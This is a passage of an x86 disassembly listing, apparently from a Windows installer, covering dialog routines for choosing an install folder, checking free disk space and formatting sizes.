  40496c:	83 ec 3c             	sub    $0x3c,%esp
  40496f:	8b 45 08             	mov    0x8(%ebp),%eax
  404972:	83 65 d8 00          	andl   $0x0,-0x28(%ebp)
  404976:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  40497a:	89 45 cc             	mov    %eax,-0x34(%ebp)
  40497d:	8b 45 0c             	mov    0xc(%ebp),%eax
  404980:	c7 45 c8 00 05 00 00 	movl   $0x500,-0x38(%ebp)
  404987:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40498a:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40498d:	50                   	push   %eax
  40498e:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  404995:	c7 45 d0 8c a3 40 00 	movl   $0x40a38c,-0x30(%ebp)
  40499c:	e8 01 12 00 00       	call   0x405ba2
  4049a1:	c9                   	leave
  4049a2:	c2 0c 00             	ret    $0xc
  4049a5:	55                   	push   %ebp
  4049a6:	8b ec                	mov    %esp,%ebp
  4049a8:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4049af:	56                   	push   %esi
  4049b0:	8b 75 14             	mov    0x14(%ebp),%esi
  4049b3:	75 26                	jne    0x4049db
  4049b5:	ff 76 30             	push   0x30(%esi)
  4049b8:	6a 1d                	push   $0x1d
  4049ba:	ff 75 08             	push   0x8(%ebp)
  4049bd:	e8 39 fb ff ff       	call   0x4044fb
  4049c2:	8b 46 3c             	mov    0x3c(%esi),%eax
  4049c5:	c1 e0 0b             	shl    $0xb,%eax
  4049c8:	05 00 a0 42 00       	add    $0x42a000,%eax
  4049cd:	50                   	push   %eax
  4049ce:	68 e8 03 00 00       	push   $0x3e8
  4049d3:	ff 75 08             	push   0x8(%ebp)
  4049d6:	e8 df 11 00 00       	call   0x405bba
  4049db:	56                   	push   %esi
  4049dc:	ff 75 10             	push   0x10(%ebp)
  4049df:	ff 75 0c             	push   0xc(%ebp)
  4049e2:	e8 7b fb ff ff       	call   0x404562
  4049e7:	5e                   	pop    %esi
  4049e8:	5d                   	pop    %ebp
  4049e9:	c2 10 00             	ret    $0x10
  4049ec:	55                   	push   %ebp
  4049ed:	8b ec                	mov    %esp,%ebp
  4049ef:	83 ec 4c             	sub    $0x4c,%esp
  4049f2:	a1 e0 1e 42 00       	mov    0x421ee0,%eax
  4049f7:	53                   	push   %ebx
  4049f8:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4049fb:	56                   	push   %esi
  4049fc:	8b 58 3c             	mov    0x3c(%eax),%ebx
  4049ff:	8b 40 38             	mov    0x38(%eax),%eax
  404a02:	c1 e3 0b             	shl    $0xb,%ebx
  404a05:	81 c3 00 a0 42 00    	add    $0x42a000,%ebx
  404a0b:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404a12:	57                   	push   %edi
  404a13:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404a16:	75 11                	jne    0x404a29
  404a18:	53                   	push   %ebx
  404a19:	68 fb 03 00 00       	push   $0x3fb
  404a1e:	e8 9d 11 00 00       	call   0x405bc0
  404a23:	53                   	push   %ebx
  404a24:	e8 01 1e 00 00       	call   0x40682a
  404a29:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404a30:	8b 75 08             	mov    0x8(%ebp),%esi
  404a33:	75 6c                	jne    0x404aa1
  404a35:	68 fb 03 00 00       	push   $0x3fb
  404a3a:	56                   	push   %esi
  404a3b:	ff 15 3c 82 40 00    	call   *0x40823c
  404a41:	53                   	push   %ebx
  404a42:	8b f8                	mov    %eax,%edi
  404a44:	e8 79 14 00 00       	call   0x405ec2
  404a49:	85 c0                	test   %eax,%eax
  404a4b:	74 10                	je     0x404a5d
  404a4d:	53                   	push   %ebx
  404a4e:	e8 a3 14 00 00       	call   0x405ef6
  404a53:	85 c0                	test   %eax,%eax
  404a55:	75 06                	jne    0x404a5d
  404a57:	53                   	push   %ebx
  404a58:	e8 ee 13 00 00       	call   0x405e4b
  404a5d:	53                   	push   %ebx
  404a5e:	57                   	push   %edi
  404a5f:	89 35 f8 89 42 00    	mov    %esi,0x4289f8
  404a65:	ff 15 1c 82 40 00    	call   *0x40821c
  404a6b:	8b 45 14             	mov    0x14(%ebp),%eax
  404a6e:	ff 70 34             	push   0x34(%eax)
  404a71:	6a 01                	push   $0x1
  404a73:	56                   	push   %esi
  404a74:	e8 82 fa ff ff       	call   0x4044fb
  404a79:	8b 45 14             	mov    0x14(%ebp),%eax
  404a7c:	ff 70 30             	push   0x30(%eax)
  404a7f:	6a 14                	push   $0x14
  404a81:	56                   	push   %esi
  404a82:	e8 74 fa ff ff       	call   0x4044fb
  404a87:	57                   	push   %edi
  404a88:	e8 a3 fa ff ff       	call   0x404530
  404a8d:	6a 09                	push   $0x9
  404a8f:	e8 dc 1e 00 00       	call   0x406970
  404a94:	85 c0                	test   %eax,%eax
  404a96:	0f 84 91 02 00 00    	je     0x404d2d
  404a9c:	6a 01                	push   $0x1
  404a9e:	57                   	push   %edi
  404a9f:	ff d0                	call   *%eax
  404aa1:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404aa8:	0f 85 d1 00 00 00    	jne    0x404b7f
  404aae:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  404ab2:	3d fb 03 00 00       	cmp    $0x3fb,%eax
  404ab7:	75 18                	jne    0x404ad1
  404ab9:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404abc:	c1 e9 10             	shr    $0x10,%ecx
  404abf:	66 81 f9 00 03       	cmp    $0x300,%cx
  404ac4:	0f 85 63 02 00 00    	jne    0x404d2d
  404aca:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404ad1:	3d e9 03 00 00       	cmp    $0x3e9,%eax
  404ad6:	0f 85 a3 00 00 00    	jne    0x404b7f
  404adc:	6a 07                	push   $0x7
  404ade:	33 c0                	xor    %eax,%eax
  404ae0:	59                   	pop    %ecx
  404ae1:	8d 7d b8             	lea    -0x48(%ebp),%edi
  404ae4:	ff 75 f8             	push   -0x8(%ebp)
  404ae7:	f3 ab                	rep stos %eax,%es:(%edi)
  404ae9:	bf 08 2f 42 00       	mov    $0x422f08,%edi
  404aee:	68 e0 16 42 00       	push   $0x4216e0
  404af3:	89 75 b4             	mov    %esi,-0x4c(%ebp)
  404af6:	89 7d bc             	mov    %edi,-0x44(%ebp)
  404af9:	c7 45 c8 42 4d 40 00 	movl   $0x404d42,-0x38(%ebp)
  404b00:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  404b03:	e8 b1 1a 00 00       	call   0x4065b9
  404b08:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404b0b:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  404b0e:	50                   	push   %eax
  404b0f:	c7 45 c4 41 00 00 00 	movl   $0x41,-0x3c(%ebp)
  404b16:	ff 15 78 81 40 00    	call   *0x408178
  404b1c:	85 c0                	test   %eax,%eax
  404b1e:	74 58                	je     0x404b78
  404b20:	50                   	push   %eax
  404b21:	ff 15 a0 82 40 00    	call   *0x4082a0
  404b27:	53                   	push   %ebx
  404b28:	e8 1e 13 00 00       	call   0x405e4b
  404b2d:	a1 30 9a 42 00       	mov    0x429a30,%eax
  404b32:	8b 80 1c 01 00 00    	mov    0x11c(%eax),%eax
  404b38:	85 c0                	test   %eax,%eax
  404b3a:	74 28                	je     0x404b64
  404b3c:	81 fb 00 48 43 00    	cmp    $0x434800,%ebx
  404b42:	75 20                	jne    0x404b64
  404b44:	50                   	push   %eax
  404b45:	6a 00                	push   $0x0
  404b47:	e8 6d 1a 00 00       	call   0x4065b9
  404b4c:	57                   	push   %edi
  404b4d:	bf c0 79 42 00       	mov    $0x4279c0,%edi
  404b52:	57                   	push   %edi
  404b53:	ff 15 00 81 40 00    	call   *0x408100
  404b59:	85 c0                	test   %eax,%eax
  404b5b:	74 07                	je     0x404b64
  404b5d:	57                   	push   %edi
  404b5e:	53                   	push   %ebx
  404b5f:	e8 34 1a 00 00       	call   0x406598
  404b64:	ff 05 f8 2e 42 00    	incl   0x422ef8
  404b6a:	53                   	push   %ebx
  404b6b:	68 fb 03 00 00       	push   $0x3fb
  404b70:	56                   	push   %esi
  404b71:	e8 44 10 00 00       	call   0x405bba
  404b76:	eb 07                	jmp    0x404b7f
  404b78:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404b7f:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404b86:	74 0d                	je     0x404b95
  404b88:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404b8f:	0f 85 98 01 00 00    	jne    0x404d2d
  404b95:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404b99:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  404b9d:	53                   	push   %ebx
  404b9e:	68 fb 03 00 00       	push   $0x3fb
  404ba3:	e8 18 10 00 00       	call   0x405bc0
  404ba8:	53                   	push   %ebx
  404ba9:	e8 a5 13 00 00       	call   0x405f53
  404bae:	85 c0                	test   %eax,%eax
  404bb0:	75 07                	jne    0x404bb9
  404bb2:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  404bb9:	be d8 0e 42 00       	mov    $0x420ed8,%esi
  404bbe:	53                   	push   %ebx
  404bbf:	56                   	push   %esi
  404bc0:	e8 b7 19 00 00       	call   0x40657c
  404bc5:	6a 01                	push   $0x1
  404bc7:	e8 a4 1d 00 00       	call   0x406970
  404bcc:	85 c0                	test   %eax,%eax
  404bce:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404bd1:	74 3a                	je     0x404c0d
  404bd3:	33 c0                	xor    %eax,%eax
  404bd5:	33 ff                	xor    %edi,%edi
  404bd7:	3b c6                	cmp    %esi,%eax
  404bd9:	74 32                	je     0x404c0d
  404bdb:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404bde:	50                   	push   %eax
  404bdf:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404be2:	50                   	push   %eax
  404be3:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  404be6:	50                   	push   %eax
  404be7:	56                   	push   %esi
  404be8:	ff 55 f4             	call   *-0xc(%ebp)
  404beb:	85 c0                	test   %eax,%eax
  404bed:	75 76                	jne    0x404c65
  404bef:	85 ff                	test   %edi,%edi
  404bf1:	74 03                	je     0x404bf6
  404bf3:	66 21 07             	and    %ax,(%edi)
  404bf6:	56                   	push   %esi
  404bf7:	e8 9b 12 00 00       	call   0x405e97
  404bfc:	8b f8                	mov    %eax,%edi
  404bfe:	66 83 27 00          	andw   $0x0,(%edi)
  404c02:	4f                   	dec    %edi
  404c03:	4f                   	dec    %edi
  404c04:	3b fe                	cmp    %esi,%edi
  404c06:	66 c7 07 5c 00       	movw   $0x5c,(%edi)
  404c0b:	75 ce                	jne    0x404bdb
  404c0d:	53                   	push   %ebx
  404c0e:	56                   	push   %esi
  404c0f:	e8 68 19 00 00       	call   0x40657c
  404c14:	56                   	push   %esi
  404c15:	e8 dc 12 00 00       	call   0x405ef6
  404c1a:	33 ff                	xor    %edi,%edi
  404c1c:	3b c7                	cmp    %edi,%eax
  404c1e:	74 03                	je     0x404c23
  404c20:	66 89 38             	mov    %di,(%eax)
  404c23:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404c26:	50                   	push   %eax
  404c27:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404c2a:	50                   	push   %eax
  404c2b:	8d 45 ec             	lea    -0x14(%ebp),%eax
  404c2e:	50                   	push   %eax
  404c2f:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404c32:	50                   	push   %eax
  404c33:	56                   	push   %esi
  404c34:	ff 15 90 80 40 00    	call   *0x408090
  404c3a:	85 c0                	test   %eax,%eax
  404c3c:	74 43                	je     0x404c81
  404c3e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404c41:	be 00 04 00 00       	mov    $0x400,%esi
  404c46:	0f af 45 ec          	imul   -0x14(%ebp),%eax
  404c4a:	56                   	push   %esi
  404c4b:	ff 75 f4             	push   -0xc(%ebp)
  404c4e:	50                   	push   %eax
  404c4f:	ff 15 48 81 40 00    	call   *0x408148
  404c55:	99                   	cltd
  404c56:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404c59:	89 55 d8             	mov    %edx,-0x28(%ebp)
  404c5c:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404c63:	eb 21                	jmp    0x404c86
  404c65:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  404c68:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  404c6b:	0f ac c8 0a          	shrd   $0xa,%ecx,%eax
  404c6f:	c1 e9 0a             	shr    $0xa,%ecx
  404c72:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404c75:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  404c78:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404c7f:	33 ff                	xor    %edi,%edi
  404c81:	be 00 04 00 00       	mov    $0x400,%esi
  404c86:	6a 05                	push   $0x5
  404c88:	e8 fc 01 00 00       	call   0x404e89
  404c8d:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404c90:	74 19                	je     0x404cab
  404c92:	8b 55 d8             	mov    -0x28(%ebp),%edx
  404c95:	33 c9                	xor    %ecx,%ecx
  404c97:	3b d1                	cmp    %ecx,%edx
  404c99:	77 10                	ja     0x404cab
  404c9b:	72 07                	jb     0x404ca4
  404c9d:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  404ca0:	3b c8                	cmp    %eax,%ecx
  404ca2:	73 07                	jae    0x404cab
  404ca4:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  404cab:	8b 0d fc 89 42 00    	mov    0x4289fc,%ecx
  404cb1:	39 79 10             	cmp    %edi,0x10(%ecx)
  404cb4:	74 30                	je     0x404ce6
  404cb6:	50                   	push   %eax
  404cb7:	6a fb                	push   $0xfffffffb
  404cb9:	68 ff 03 00 00       	push   $0x3ff
  404cbe:	e8 ae 01 00 00       	call   0x404e71
  404cc3:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404cc6:	74 10                	je     0x404cd8
  404cc8:	ff 75 d8             	push   -0x28(%ebp)
  404ccb:	ff 75 d4             	push   -0x2c(%ebp)
  404cce:	6a fc                	push   $0xfffffffc
  404cd0:	56                   	push   %esi
  404cd1:	e8 d2 00 00 00       	call   0x404da8
  404cd6:	eb 0e                	jmp    0x404ce6
  404cd8:	68 c8 0e 42 00       	push   $0x420ec8
  404cdd:	56                   	push   %esi
  404cde:	ff 75 08             	push   0x8(%ebp)
  404ce1:	e8 d4 0e 00 00       	call   0x405bba
  404ce6:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404ce9:	3b c7                	cmp    %edi,%eax
  404ceb:	a3 c4 9a 42 00       	mov    %eax,0x429ac4
  404cf0:	75 0a                	jne    0x404cfc
  404cf2:	6a 07                	push   $0x7
  404cf4:	e8 12 c7 ff ff       	call   0x40140b
  404cf9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404cfc:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404cff:	85 70 14             	test   %esi,0x14(%eax)
  404d02:	74 03                	je     0x404d07
  404d04:	89 7d fc             	mov    %edi,-0x4(%ebp)
  404d07:	33 c0                	xor    %eax,%eax
  404d09:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  404d0c:	0f 94 c0             	sete   %al
  404d0f:	50                   	push   %eax
  404d10:	e8 08 f8 ff ff       	call   0x40451d
  404d15:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  404d18:	75 0d                	jne    0x404d27
  404d1a:	39 3d f8 2e 42 00    	cmp    %edi,0x422ef8
  404d20:	75 05                	jne    0x404d27
  404d22:	e8 1e fc ff ff       	call   0x404945
  404d27:	89 3d f8 2e 42 00    	mov    %edi,0x422ef8
  404d2d:	ff 75 14             	push   0x14(%ebp)
  404d30:	ff 75 10             	push   0x10(%ebp)
  404d33:	ff 75 0c             	push   0xc(%ebp)
  404d36:	e8 27 f8 ff ff       	call   0x404562
  404d3b:	5f                   	pop    %edi
  404d3c:	5e                   	pop    %esi
  404d3d:	5b                   	pop    %ebx
  404d3e:	c9                   	leave
  404d3f:	c2 10 00             	ret    $0x10
  404d42:	55                   	push   %ebp
  404d43:	8b ec                	mov    %esp,%ebp
  404d45:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  404d49:	56                   	push   %esi
  404d4a:	8b 35 58 82 40 00    	mov    0x408258,%esi
  404d50:	75 1c                	jne    0x404d6e
  404d52:	ff 75 14             	push   0x14(%ebp)
  404d55:	68 fb 03 00 00       	push   $0x3fb
  404d5a:	e8 61 0e 00 00       	call   0x405bc0
  404d5f:	ff 75 14             	push   0x14(%ebp)
  404d62:	6a 01                	push   $0x1
  404d64:	68 67 04 00 00       	push   $0x467
  404d69:	ff 75 08             	push   0x8(%ebp)
  404d6c:	ff d6                	call   *%esi
  404d6e:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  404d72:	75 2d                	jne    0x404da1
  404d74:	ff 75 14             	push   0x14(%ebp)
  404d77:	ff 75 10             	push   0x10(%ebp)
  404d7a:	ff 15 74 81 40 00    	call   *0x408174
  404d80:	85 c0                	test   %eax,%eax
  404d82:	74 0e                	je     0x404d92
  404d84:	6a 07                	push   $0x7
  404d86:	e8 80 c6 ff ff       	call   0x40140b
  404d8b:	85 c0                	test   %eax,%eax
  404d8d:	75 03                	jne    0x404d92
  404d8f:	40                   	inc    %eax
  404d90:	eb 02                	jmp    0x404d94
  404d92:	33 c0                	xor    %eax,%eax
  404d94:	50                   	push   %eax
  404d95:	6a 00                	push   $0x0
  404d97:	68 65 04 00 00       	push   $0x465
  404d9c:	ff 75 08             	push   0x8(%ebp)
  404d9f:	ff d6                	call   *%esi
  404da1:	33 c0                	xor    %eax,%eax
  404da3:	5e                   	pop    %esi
  404da4:	5d                   	pop    %ebp
  404da5:	c2 10 00             	ret    $0x10
  404da8:	55                   	push   %ebp
  404da9:	8b ec                	mov    %esp,%ebp
  404dab:	81 ec 80 00 00 00    	sub    $0x80,%esp
  404db1:	8b 45 14             	mov    0x14(%ebp),%eax
  404db4:	53                   	push   %ebx
  404db5:	56                   	push   %esi
  404db6:	8b 75 10             	mov    0x10(%ebp),%esi
  404db9:	57                   	push   %edi
  404dba:	6a dc                	push   $0xffffffdc
  404dbc:	85 c0                	test   %eax,%eax
  404dbe:	5b                   	pop    %ebx
  404dbf:	74 0b                	je     0x404dcc
  404dc1:	0f ac c6 14          	shrd   $0x14,%eax,%esi
  404dc5:	c1 e8 14             	shr    $0x14,%eax
  404dc8:	33 ff                	xor    %edi,%edi
  404dca:	eb 4e                	jmp    0x404e1a
  404dcc:	6a 14                	push   $0x14
  404dce:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  404dd4:	59                   	pop    %ecx
  404dd5:	8b c6                	mov    %esi,%eax
  404dd7:	73 06                	jae    0x404ddf
  404dd9:	6a 0a                	push   $0xa
  404ddb:	59                   	pop    %ecx
  404ddc:	6a dd                	push   $0xffffffdd
  404dde:	5b                   	pop    %ebx
  404ddf:	81 fe 00 04 00 00    	cmp    $0x400,%esi
  404de5:	73 05                	jae    0x404dec
  404de7:	6a de                	push   $0xffffffde
  404de9:	33 c9                	xor    %ecx,%ecx
  404deb:	5b                   	pop    %ebx
  404dec:	81 fe 33 33 ff ff    	cmp    $0xffff3333,%esi
  404df2:	73 0d                	jae    0x404e01
  404df4:	33 c0                	xor    %eax,%eax
  404df6:	6a 14                	push   $0x14
  404df8:	40                   	inc    %eax
  404df9:	5f                   	pop    %edi
  404dfa:	d3 e0                	shl    %cl,%eax
  404dfc:	99                   	cltd
  404dfd:	f7 ff                	idiv   %edi
  404dff:	03 c6                	add    %esi,%eax
  404e01:	8b f0                	mov    %eax,%esi
  404e03:	25 ff ff ff 00       	and    $0xffffff,%eax
  404e08:	6a 0a                	push   $0xa
  404e0a:	33 d2                	xor    %edx,%edx
  404e0c:	8d 04 80             	lea    (%eax,%eax,4),%eax
  404e0f:	03 c0                	add    %eax,%eax
  404e11:	d3 e8                	shr    %cl,%eax
  404e13:	d3 ee                	shr    %cl,%esi
  404e15:	59                   	pop    %ecx
  404e16:	f7 f1                	div    %ecx
  404e18:	8b fa                	mov    %edx,%edi
  404e1a:	8d 45 c0             	lea    -0x40(%ebp),%eax
  404e1d:	6a df                	push   $0xffffffdf
  404e1f:	50                   	push   %eax
  404e20:	e8 94 17 00 00       	call   0x4065b9
  404e25:	50                   	push   %eax
  404e26:	8d 45 80             	lea    -0x80(%ebp),%eax
  404e29:	53                   	push   %ebx
  404e2a:	50                   	push   %eax
  404e2b:	e8 89 17 00 00       	call   0x4065b9
  404e30:	50                   	push   %eax
  404e31:	57                   	push   %edi
  404e32:	56                   	push   %esi
  404e33:	68 98 a3 40 00       	push   $0x40a398
  404e38:	ff 75 0c             	push   0xc(%ebp)
  404e3b:	be 08 2f 42 00       	mov    $0x422f08,%esi
  404e40:	56                   	push   %esi
  404e41:	e8 73 17 00 00       	call   0x4065b9
  404e46:	56                   	push   %esi
  404e47:	8b f8                	mov    %eax,%edi
  404e49:	e8 44 17 00 00       	call   0x406592
  404e4e:	8d 04 47             	lea    (%edi,%eax,2),%eax
  404e51:	50                   	push   %eax
  404e52:	ff 15 2c 82 40 00    	call   *0x40822c
  404e58:	83 c4 18             	add    $0x18,%esp
  404e5b:	56                   	push   %esi
  404e5c:	ff 75 08             	push   0x8(%ebp)
  404e5f:	ff 35 f8 89 42 00    	push   0x4289f8
  404e65:	e8 50 0d 00 00       	call   0x405bba
  404e6a:	5f                   	pop    %edi
  404e6b:	5e                   	pop    %esi
  404e6c:	5b                   	pop    %ebx
  404e6d:	c9                   	leave
  404e6e:	c2 10 00             	ret    $0x10
  404e71:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404e75:	33 c9                	xor    %ecx,%ecx
  404e77:	51                   	push   %ecx
  404e78:	50                   	push   %eax
  404e79:	ff 74 24 10          	push   0x10(%esp)
  404e7d:	ff 74 24 10          	push   0x10(%esp)
  404e81:	e8 22 ff ff ff       	call   0x404da8
  404e86:	c2 0c 00             	ret    $0xc
  404e89:	8b 15 4c 9a 42 00    	mov    0x429a4c,%edx
  404e8f:	8b 0d 48 9a 42 00    	mov    0x429a48,%ecx
  404e95:	33 c0                	xor    %eax,%eax
  404e97:	85 d2                	test   %edx,%edx
  404e99:	74 18                	je     0x404eb3
  404e9b:	56                   	push   %esi
  404e9c:	f6 41 08 01          	testb  $0x1,0x8(%ecx)
  404ea0:	74 07                	je     0x404ea9
  404ea2:	8b 74 24 08          	mov    0x8(%esp),%esi
  404ea6:	03 04 b1             	add    (%ecx,%esi,4),%eax
  404ea9:	81 c1 18 08 00 00    	add    $0x818,%ecx
  404eaf:	4a                   	dec    %edx
  404eb0:	75 ea                	jne    0x404e9c
  404eb2:	5e                   	pop    %esi
  404eb3:	c2 04 00             	ret    $0x4
  404eb6:	55                   	push   %ebp
  404eb7:	8b ec                	mov    %esp,%ebp
  404eb9:	83 ec 38             	sub    $0x38,%esp
  404ebc:	56                   	push   %esi
  404ebd:	8b 35 58 82 40 00    	mov    0x408258,%esi
  404ec3:	57                   	push   %edi
  404ec4:	8b 7d 08             	mov    0x8(%ebp),%edi
  404ec7:	6a 00                	push   $0x0
  404ec9:	6a 09                	push   $0x9
  404ecb:	68 0a 11 00 00       	push   $0x110a
  404ed0:	57                   	push   %edi
  404ed1:	ff d6                	call   *%esi
  404ed3:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  404ed7:	74 3c                	je     0x404f15
  404ed9:	ff 15 bc 81 40 00    	call   *0x4081bc
  404edf:	0f bf c8             	movswl %ax,%ecx
  404ee2:	c1 e8 10             	shr    $0x10,%eax
  404ee5:	0f bf c0             	movswl %ax,%eax
  404ee8:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404eeb:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404eee:	50                   	push   %eax
  404eef:	57                   	push   %edi
  404ef0:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  404ef3:	ff 15 ec 81 40 00    	call   *0x4081ec
  404ef9:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404efc:	50                   	push   %eax
  404efd:	6a 00                	push   $0x0
  404eff:	68 11 11 00 00       	push   $0x1111
  404f04:	57                   	push   %edi
  404f05:	ff d6                	call   *%esi
  404f07:	f6 45 f8 66          	testb  $0x66,-0x8(%ebp)
  404f0b:	75 05                	jne    0x404f12
  404f0d:	83 c8 ff             	or     $0xffffffff,%eax
  404f10:	eb 1e                	jmp    0x404f30
  404f12:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404f15:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404f18:	8d 45 c8             	lea    -0x38(%ebp),%eax
  404f1b:	50                   	push   %eax
  404f1c:	6a 00                	push   $0x0
  404f1e:	68 3e 11 00 00       	push   $0x113e
  404f23:	57                   	push   %edi
  404f24:	c7 45 c8 04 00 00 00 	movl   $0x4,-0x38(%ebp)
  404f2b:	ff d6                	call   *%esi
  404f2d:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404f30:	5f                   	pop    %edi
  404f31:	5e                   	pop    %esi
  404f32:	c9                   	leave
  404f33:	c2 08 00             	ret    $0x8
  404f36:	56                   	push   %esi
  404f37:	57                   	push   %edi
  404f38:	be 00 a0 42 00       	mov    $0x42a000,%esi
  404f3d:	bf 08 2f 42 00       	mov    $0x422f08,%edi
  404f42:	56                   	push   %esi
  404f43:	57                   	push   %edi
  404f44:	e8 33 16 00 00       	call   0x40657c
  404f49:	ff 74 24 10          	push   0x10(%esp)
  404f4d:	56                   	push   %esi
  404f4e:	e8 70 15 00 00       	call   0x4064c3
  404f53:	ff 74 24 0c          	push   0xc(%esp)
  404f57:	e8 af c4 ff ff       	call   0x40140b
  404f5c:	57                   	push   %edi
  404f5d:	56                   	push   %esi
  404f5e:	e8 19 16 00 00       	call   0x40657c
  404f63:	5f                   	pop    %edi
  404f64:	5e                   	pop    %esi
  404f65:	c2 08 00             	ret    $0x8
  404f68:	55                   	push   %ebp
  404f69:	8b ec                	mov    %esp,%ebp
  404f6b:	83 ec 54             	sub    $0x54,%esp
  404f6e:	53                   	push   %ebx
  404f6f:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404f72:	56                   	push   %esi
  404f73:	8b 35 3c 82 40 00    	mov    0x40823c,%esi
  404f79:	57                   	push   %edi
  404f7a:	68 f9 03 00 00       	push   $0x3f9
  404f7f:	53                   	push   %ebx
  404f80:	ff d6                	call   *%esi
  404f82:	68 08 04 00 00       	push   $0x408
  404f87:	53                   	push   %ebx
  404f88:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404f8b:	ff d6                	call   *%esi
  404f8d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404f90:	a1 48 9a 42 00       	mov    0x429a48,%eax
  404f95:	8b 35 58 82 40 00    	mov    0x408258,%esi
  404f9b:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404f9e:	a1 30 9a 42 00       	mov    0x429a30,%eax
  404fa3:	33 ff                	xor    %edi,%edi
  404fa5:	05 94 00 00 00       	add    $0x94,%eax
  404faa:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404fb1:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404fb4:	0f 85 25 02 00 00    	jne    0x4051df
  404fba:	a1 4c 9a 42 00       	mov    0x429a4c,%eax
  404fbf:	89 7d e0             	mov    %edi,-0x20(%ebp)
  404fc2:	c1 e0 02             	shl    $0x2,%eax
  404fc5:	50                   	push   %eax
  404fc6:	6a 40                	push   $0x40
  404fc8:	c7 45 f0 02 00 00 00 	movl   $0x2,-0x10(%ebp)
  404fcf:	89 1d 80 9a 42 00    	mov    %ebx,0x429a80
  404fd5:	ff 15 10 81 40 00    	call   *0x408110
  404fdb:	57                   	push   %edi
  404fdc:	57                   	push   %edi
  404fdd:	57                   	push   %edi
  404fde:	57                   	push   %edi
  404fdf:	6a 6e                	push   $0x6e
  404fe1:	a3 00 2f 42 00       	mov    %eax,0x422f00
  404fe6:	ff 35 20 9a 42 00    	push   0x429a20
  404fec:	ff 15 44 82 40 00    	call   *0x408244
  404ff2:	83 0d f4 2e 42 00 ff 	orl    $0xffffffff,0x422ef4
  404ff9:	68 75 55 40 00       	push   $0x405575
  404ffe:	6a fc                	push   $0xfffffffc
  405000:	8b d8                	mov    %eax,%ebx
  405002:	ff 75 fc             	push   -0x4(%ebp)
  405005:	ff 15 40 82 40 00    	call   *0x408240
  40500b:	57                   	push   %edi
  40500c:	6a 06                	push   $0x6
  40500e:	6a 21                	push   $0x21
  405010:	6a 10                	push   $0x10
  405012:	6a 10                	push   $0x10
  405014:	a3 fc 2e 42 00       	mov    %eax,0x422efc
  405019:	ff 15 40 80 40 00    	call   *0x408040
  40501f:	68 ff 00 ff 00       	push   $0xff00ff
  405024:	53                   	push   %ebx
  405025:	50                   	push   %eax
  405026:	a3 ec 2e 42 00       	mov    %eax,0x422eec
  40502b:	ff 15 3c 80 40 00    	call   *0x40803c
  405031:	ff 35 ec 2e 42 00    	push   0x422eec
  405037:	6a 02                	push   $0x2
  405039:	68 09 11 00 00       	push   $0x1109
  40503e:	ff 75 fc             	push   -0x4(%ebp)
  405041:	ff d6                	call   *%esi
  405043:	57                   	push   %edi
  405044:	57                   	push   %edi
  405045:	68 1c 11 00 00       	push   $0x111c
  40504a:	ff 75 fc             	push   -0x4(%ebp)
  40504d:	ff d6                	call   *%esi
